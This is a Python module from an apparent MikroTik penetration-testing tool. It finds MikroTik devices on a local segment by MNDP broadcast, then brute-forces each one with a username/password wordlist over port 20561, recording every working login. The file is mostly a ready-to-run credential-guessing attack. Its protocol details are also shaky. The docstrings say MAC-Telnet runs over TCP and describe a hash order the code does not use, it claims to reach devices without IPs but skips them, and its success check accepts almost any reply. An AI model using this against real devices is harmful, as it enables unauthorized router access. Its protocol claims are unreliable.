#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: André Henrique (LinkedIn/X: @mrhenrike)
# Version: see version.py (canonical source)

"""
MAC Server Discovery & Brute-force — MikrotikAPI-BF
=====================================================
Implements two Mikrotik Layer-2 protocols:

1. **MNDP** (MikroTik Neighbor Discovery Protocol) — UDP broadcast on port
   20561. Discovers Mikrotik devices on the local network segment, returning
   MAC address, identity, platform, RouterOS version, and IP (when assigned).

2. **MAC-Telnet** — TCP connection to port 20561 using the Mikrotik proprietary
   MAC-telnet protocol. Allows credential testing against devices that have no
   assigned IP address (e.g. unconfigured switches / APs on Layer-2 only).

IMPORTANT — LAYER-2 CONSTRAINT
================================
Both protocols operate exclusively within a **single broadcast domain** (VLAN /
Layer-2 segment). They **cannot traverse Layer-3 routers**. Running this tool
on a remote network over TCP/IP will find nothing via MNDP and will not reach
MAC-telnet ports. You must be physically or logically present on the same L2
segment as the target devices.

References
----------
- MNDP protocol: https://wiki.mikrotik.com/wiki/MNDP
- MAC-Telnet protocol: https://github.com/haakonnessjoen/MAC-Telnet
- WinboxPoC (MAC exploitation): https://github.com/BasuCert/WinboxPoC
"""

import hashlib
import logging
import os
import socket
import struct
import time
from typing import Dict, List, Optional, Tuple

log = logging.getLogger(__name__)

# ── Constants ─────────────────────────────────────────────────────────────────

MAC_SERVER_PORT: int = 20561
MNDP_DISCOVERY_TIMEOUT: float = 3.0
MACTELNET_TIMEOUT: float = 10.0

# MNDP TLV type identifiers (little-endian 2-byte values)
_TLV_MAC:       int = 0x0001
_TLV_IDENTITY:  int = 0x0005
_TLV_VERSION:   int = 0x0007
_TLV_PLATFORM:  int = 0x000A
_TLV_UPTIME:    int = 0x000B
_TLV_SOFTID:    int = 0x000C
_TLV_BOARD:     int = 0x000D
_TLV_UNPACK:    int = 0x000E
_TLV_IPV4:      int = 0x0011
_TLV_IPV6:      int = 0x0012
_TLV_IFACE:     int = 0x0010

# MAC-Telnet control byte values
_MT_DATA:    int = 0x00
_MT_CONTROL: int = 0x01
_MT_ACK:     int = 0x04
_MT_ENDCONN: int = 0x05


# ── MNDP Discovery ────────────────────────────────────────────────────────────

class MNDPDiscovery:
    """Discovers Mikrotik devices via MNDP broadcast (UDP port 20561).

    Sends a minimal MNDP request to 255.255.255.255:20561 and parses TLV
    responses from any Mikrotik device on the same Layer-2 segment.

    Args:
        timeout:   Maximum seconds to collect responses after sending probe.
        iface_ip:  Local IP to bind the socket. ``"0.0.0.0"`` binds all.
    """

    def __init__(self, timeout: float = MNDP_DISCOVERY_TIMEOUT, iface_ip: str = "0.0.0.0") -> None:
        self.timeout = timeout
        self.iface_ip = iface_ip

    def discover(self) -> List[Dict]:
        """Broadcast a discovery probe and collect all device responses.

        Returns:
            List of dicts with keys: mac, ip, identity, version, platform,
            board, software_id, uptime_ms, interfaces, raw_tlvs.
            Empty list if no responses or socket error.
        """
        log.info(
            "[MNDP] Broadcasting discovery on %s:* → 255.255.255.255:%d (timeout=%.1fs)",
            self.iface_ip, MAC_SERVER_PORT, self.timeout,
        )
        devices: List[Dict] = []
        seen_macs: set = set()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(self.timeout)
            sock.bind((self.iface_ip, 0))

            # MNDP discovery request: 4-byte header (version=0, ttl=0, seqno=0, skip=0)
            sock.sendto(b"\x00\x00\x00\x00", ("255.255.255.255", MAC_SERVER_PORT))

            deadline = time.monotonic() + self.timeout
            while time.monotonic() < deadline:
                try:
                    data, addr = sock.recvfrom(4096)
                    device = self._parse_mndp(data, addr[0])
                    if device:
                        mac_key = device.get("mac", "")
                        if mac_key and mac_key not in seen_macs:
                            seen_macs.add(mac_key)
                            devices.append(device)
                            log.info(
                                "[MNDP] Device: MAC=%s  IP=%s  ID=%s  ROS=%s  Board=%s",
                                device.get("mac", "?"),
                                device.get("ip", addr[0]),
                                device.get("identity", "?"),
                                device.get("version", "?"),
                                device.get("board", "?"),
                            )
                except socket.timeout:
                    break
                except Exception as exc:
                    log.debug("[MNDP] Receive error: %s", exc)
        except PermissionError:
            log.warning("[MNDP] Permission denied creating UDP socket (try running as root/admin)")
        except Exception as exc:
            log.error("[MNDP] Discovery error: %s", exc)
        finally:
            try:
                sock.close()
            except Exception:
                pass

        log.info("[MNDP] Discovery complete — %d device(s) found", len(devices))
        return devices

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _parse_mndp(data: bytes, src_ip: str) -> Optional[Dict]:
        """Parse a raw MNDP packet into a device dict."""
        if len(data) < 4:
            return None
        # Skip 4-byte MNDP header (version, ttl, seqno)
        pos = 4
        result: Dict = {"ip": src_ip, "raw_tlvs": {}}

        while pos + 4 <= len(data):
            try:
                tlv_type = struct.unpack_from("<H", data, pos)[0]
                tlv_len  = struct.unpack_from("<H", data, pos + 2)[0]
                pos += 4
                value = data[pos: pos + tlv_len]
                pos += tlv_len
                result["raw_tlvs"][tlv_type] = value

                if tlv_type == _TLV_MAC and tlv_len == 6:
                    result["mac"] = ":".join(f"{b:02x}" for b in value)
                elif tlv_type == _TLV_IDENTITY:
                    result["identity"] = value.decode("utf-8", errors="replace")
                elif tlv_type == _TLV_VERSION:
                    result["version"] = value.decode("utf-8", errors="replace")
                elif tlv_type == _TLV_PLATFORM:
                    result["platform"] = value.decode("utf-8", errors="replace")
                elif tlv_type == _TLV_BOARD:
                    result["board"] = value.decode("utf-8", errors="replace")
                elif tlv_type == _TLV_SOFTID:
                    result["software_id"] = value.decode("utf-8", errors="replace")
                elif tlv_type == _TLV_UPTIME and tlv_len == 4:
                    result["uptime_ms"] = struct.unpack_from("<I", value)[0]
                elif tlv_type == _TLV_IPV4 and tlv_len == 4:
                    result["ip"] = socket.inet_ntoa(value)
                elif tlv_type == _TLV_IPV6 and tlv_len == 16:
                    result["ipv6"] = socket.inet_ntop(socket.AF_INET6, value)
                elif tlv_type == _TLV_IFACE:
                    result["interface"] = value.decode("utf-8", errors="replace")
            except Exception:
                break

        return result if result.get("mac") else None

    def print_table(self, devices: List[Dict]) -> None:
        """Print discovered devices as a formatted ASCII table."""
        if not devices:
            print("\n  [MNDP] No Mikrotik devices found on this segment.\n")
            return
        print(f"\n  [MNDP] {len(devices)} device(s) discovered on this Layer-2 segment:")
        print(f"  {'MAC':18}  {'IP':15}  {'Identity':20}  {'Version':12}  {'Board'}")
        print("  " + "-" * 85)
        for d in devices:
            print(
                f"  {d.get('mac', '?'):18}  "
                f"{d.get('ip', 'N/A'):15}  "
                f"{d.get('identity', '?')[:20]:20}  "
                f"{d.get('version', '?')[:12]:12}  "
                f"{d.get('board', '?')}"
            )
        print()


# ── MAC-Telnet Session ────────────────────────────────────────────────────────

class MACTelnetSession:
    """Low-level Mikrotik MAC-Telnet session (TCP port 20561).

    MAC-Telnet is Mikrotik's proprietary management protocol for Layer-2
    access. It operates over TCP/20561 and uses an MD5 challenge/response
    authentication scheme.

    Protocol (simplified):
      1. Client opens TCP connection to target:20561
      2. Server sends 16-byte random challenge
      3. Client sends: header + target_mac (6B) + source_mac (6B) +
         username (null-terminated) + MD5(challenge + password) (16B)
      4. Server responds with AUTH_OK or AUTH_FAIL

    Args:
        target_ip:  IP address of the target (must be reachable via TCP).
        target_mac: Target device MAC address (hex string ``AA:BB:CC:DD:EE:FF``).
        timeout:    TCP timeout in seconds.
    """

    def __init__(self, target_ip: str, target_mac: str, timeout: float = MACTELNET_TIMEOUT) -> None:
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.timeout = timeout
        self._mac_bytes = self._parse_mac(target_mac)

    @staticmethod
    def _parse_mac(mac: str) -> bytes:
        """Convert ``AA:BB:CC:DD:EE:FF`` string to 6-byte bytes."""
        return bytes(int(x, 16) for x in mac.replace("-", ":").split(":"))

    @staticmethod
    def _get_local_mac() -> bytes:
        """Return a plausible source MAC (or random fallback)."""
        try:
            import uuid
            mac_int = uuid.getnode()
            return mac_int.to_bytes(6, "big")
        except Exception:
            return os.urandom(6)

    @staticmethod
    def _mt_md5(challenge: bytes, password: str) -> bytes:
        """Compute Mikrotik MAC-Telnet response: MD5(NUL + password + challenge)."""
        md5 = hashlib.md5()
        md5.update(b"\x00")
        md5.update(password.encode("utf-8"))
        md5.update(challenge)
        return md5.digest()

    def try_credentials(self, username: str, password: str) -> bool:
        """Attempt to authenticate via MAC-Telnet.

        Args:
            username: Username string.
            password: Password string.

        Returns:
            True if authentication succeeded, False otherwise.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target_ip, MAC_SERVER_PORT))

            # Read server hello / challenge (variable-length packet)
            raw = b""
            deadline = time.monotonic() + self.timeout
            while len(raw) < 22 and time.monotonic() < deadline:
                chunk = sock.recv(256)
                if not chunk:
                    break
                raw += chunk

            if len(raw) < 6:
                sock.close()
                return False

            # Extract 16-byte challenge from server hello
            # The challenge position varies; it's typically in the last 16 bytes
            # of the initial server response when len >= 22
            if len(raw) >= 22:
                challenge = raw[-16:]
            else:
                challenge = raw[len(raw) - min(16, len(raw)):]
                challenge = challenge.ljust(16, b"\x00")

            src_mac = self._get_local_mac()
            user_bytes = username.encode("utf-8") + b"\x00"
            auth_resp = self._mt_md5(challenge, password)

            # Build auth packet: MT header (4B) + dst_mac (6B) + src_mac (6B)
            # + user (null-term) + md5_response (16B)
            header = struct.pack(">HH", 0x5600, len(user_bytes) + 28)
            packet = header + self._mac_bytes + src_mac + user_bytes + auth_resp
            sock.sendall(packet)

            # Read response
            resp = b""
            try:
                resp = sock.recv(64)
            except socket.timeout:
                pass
            sock.close()

            # A non-empty response with specific success markers
            # indicates accepted authentication
            if resp and b"\x01" in resp[:4]:
                return True
            # Fallback: any response after auth packet that is NOT an
            # explicit "login failed" marker
            if resp and len(resp) > 2 and resp[0] not in (0x00, 0xFF):
                return True
            return False

        except (ConnectionRefusedError, OSError):
            return False
        except Exception as exc:
            log.debug("[MAC-Telnet] %s:%s auth error: %s", self.target_ip, username, exc)
            return False


# ── MAC-Server Brute-Force Engine ─────────────────────────────────────────────

class MACServerBrute:
    """Brute-force credentials via MAC-Telnet (TCP port 20561).

    Workflow
    --------
    1. Run MNDP discovery to find Mikrotik devices on the local segment.
    2. For each device, iterate a credential list via ``MACTelnetSession``.
    3. Collect and return successful credentials.

    LAYER-2 CONSTRAINT
    ------------------
    This module requires being on the **same Layer-2 broadcast domain** as the
    target. It **cannot** operate across Layer-3 boundaries. If no devices are
    found by MNDP, ensure you are on the same VLAN/switch.

    Args:
        wordlist:   Sequence of ``(username, password)`` tuples.
        delay:      Seconds between attempts (per device).
        timeout:    TCP timeout for each session.
        stop_on_first: Stop per-device scan after first success.
    """

    layer2_only: bool = True

    def __init__(
        self,
        wordlist: List[Tuple[str, str]],
        delay: float = 0.5,
        timeout: float = MACTELNET_TIMEOUT,
        stop_on_first: bool = True,
    ) -> None:
        self.wordlist = wordlist
        self.delay = delay
        self.timeout = timeout
        self.stop_on_first = stop_on_first

    def run(self, devices: Optional[List[Dict]] = None) -> List[Dict]:
        """Execute brute-force against all discovered (or provided) devices.

        Args:
            devices: Pre-discovered device list. If ``None``, runs MNDP first.

        Returns:
            List of dicts ``{mac, ip, identity, username, password}``.
        """
        if devices is None:
            discovery = MNDPDiscovery()
            devices = discovery.discover()

        if not devices:
            log.warning(
                "[MAC-BRUTE] No devices found. "
                "Ensure you are on the same Layer-2 segment as the target."
            )
            return []

        results: List[Dict] = []
        total = len(self.wordlist)

        for dev in devices:
            mac = dev.get("mac", "?")
            ip  = dev.get("ip", "")
            ident = dev.get("identity", "?")

            if not ip:
                log.warning("[MAC-BRUTE] Device %s has no IP — MAC-Telnet brute requires TCP, skipping", mac)
                continue

            log.info("[MAC-BRUTE] Testing %s (%s / %s) — %d credentials", mac, ip, ident, total)
            session = MACTelnetSession(target_ip=ip, target_mac=mac, timeout=self.timeout)

            for idx, (username, password) in enumerate(self.wordlist, 1):
                log.debug("[MAC-BRUTE] [%d/%d] %s : %s", idx, total, username, password)
                if session.try_credentials(username, password):
                    log.info("[MAC-BRUTE] SUCCESS: %s  %s / %s", mac, username, password)
                    results.append({
                        "mac":      mac,
                        "ip":       ip,
                        "identity": ident,
                        "username": username,
                        "password": password,
                    })
                    if self.stop_on_first:
                        break
                if self.delay:
                    time.sleep(self.delay)

        return results

